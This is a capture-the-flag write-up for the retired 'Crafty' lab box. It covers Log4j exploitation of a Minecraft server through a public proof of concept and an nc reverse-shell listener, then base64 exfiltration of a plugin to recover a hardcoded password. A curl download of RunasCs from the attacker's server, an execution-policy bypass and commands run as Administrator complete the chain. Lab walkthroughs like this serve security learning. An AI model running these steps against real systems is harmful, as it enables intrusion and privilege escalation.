---
title: "Crafty Write-Up"
date: 2025-07-06T22:05:42-05:00
draft: false
author: Jarpiano
tags:
    - WriteUp
image: /images/crafty-banner.png
description:
toc:
center: true
---
# Crafty (Easy) Box
Overall a very fun box. Crafty is a retired box that explores a Log4j vulnerability present in a 1.16.16 Minecraft Server.

## Initial Foothold
Reading the description, the box has a pre-auth Log4j vulnerability. But before going into that, we should scan the ports.
`sudo nmap <IP> -sS -Pn -n --disable-arp -p-`
It looks like there are two ports open: port 80 and port 25565.
Doing a quick version scan `(nmap <IP> -sV -sC <PORT>)` shows us that the target is running on a windows machine with a website on 80 and a Minecraft Server Version 1.16.5 on port 25565. First we'll check out port 80. A quick `ffuf` command leaves us with a few hits that aren't worth much. There doesn't seem to be a attack vector for Log4j either as there aren't any login parameters and attempting to exploit the HTTP Headers with some Metasploit modules didn't work.
Curling the IP with port 25565 gives us a `Non-HTTP Response` as expected.

Alright, before exploiting the server. Let's download [TLauncher](https://tlauncher.org/en/) to set up a foothold on the server. After downloading the zip folder (assuming we're on Linux), we an unzip it and using the

```
java -jar TLauncher.jar
```


Fill in the username section with something arbitrary and for the version, since we know it's a 1.16.5 server, we should select that and install. Once installed, we can launch Minecraft. On `Multiplayer`, we can add a server using our IP or use a direct connection. Now we're in!

Alright, there's a POC available on GitHub for the Log4j vulnerability from [kozmer](https://github.com/kozmer/log4j-shell-poc). We can clone this using `git clone https://github.com/kozmer/log4j-shell-poc.git`. The README asks us to download a very specific version of Java. After downloading and moving it to our folder, unzip it. 
```
python3 poc.py --userip <OUR IP> --webport 8000 --lport 9001
```
Next we can set up a `nc` listener using `nc -lvnp 9001`.

Let's go back to Minecraft, type `T` to access the chat and type our POC's `${.../a}` payload. It didn't work.

An initial run of the code above doesn't work. Let's take a peek into poc.py. We can see here that the POC is trying to run the Linux command `/bin/sh`; however, since we're on a Windows machine, we need to use a Windows CLI. Let's replace it with `cmd.exe`. 

Redoing the steps above shows us that the exploit worked. We can find our flag in the Desktop folder of the `svc_minecraft` user.

## Privilege Escalation
The description for the box tells us that there's an exposed credential in a plugin. Our server folder has one plugin named `playercounter*.jar`. We can't do much with it here so let's convert it into base64 and transfer it back to our machine. We can do so with:
```powershell
[Convert]::ToBase64String((Get-Content -path "<PATH>" -Encoding byte))
```
Copy and paste the string to a file in our machine. Then we can turn it back to a `.jar` file using:
```bash
cat <file> | tr -d "\n" | base64 -d | playercounter.jar
```
We can "unzip" the jar file by doing `jar xf playercounter.jar`. And we can inspect files from there. Following the `htb` folder down to the last leaf, we can see a `PlayerCounter.class` file. To extract strings we can either use the `strings` command or use `javap` for some clean output. Let's use the latter:
``` shell
javap -c PlayerCounter.class
```
Alright, we can see here that just below the 127.0.0.1 address, there's a defined String with a suspicious value. Let's try to use that.

Back on our reverse shell, we can use the RunAs command, but, unfortunately, I couldn't get the password prompt to work. An alternative is the [RunasCS.exe](https://github.com/antonioCoco/RunasCs) free to download on GitHub. We can't connect to non-VPN tunneled traffic on the machine, so we'll download first on our host. We can then setup a Python server and curl our server from the target:
```shell
python3 -m http.server 4444
```
```shell target
curl <IP>:<PORT>/RunasCS.exe -o RunasCS.exe
```
If the standalone file doesn't work, we can curl the zip folder instead and use `Expand-Archive` in PowerShell to extract the files. Before execution, let's make the the execution policy is set to process.

```PowerShell
Set-ExecutionPolicy Bypass -Process Scope
```

We now can execute:
```powershell
./RunasCS.exe Administrator <PASSWORD> "cmd /c whoami"
```
We should see as our output:
```powershell
crafty/Administrator
```
To get the flag we can execute the same command, replacing the CMD with `type <flag location>.`

Happy Hunting!

**Fin.**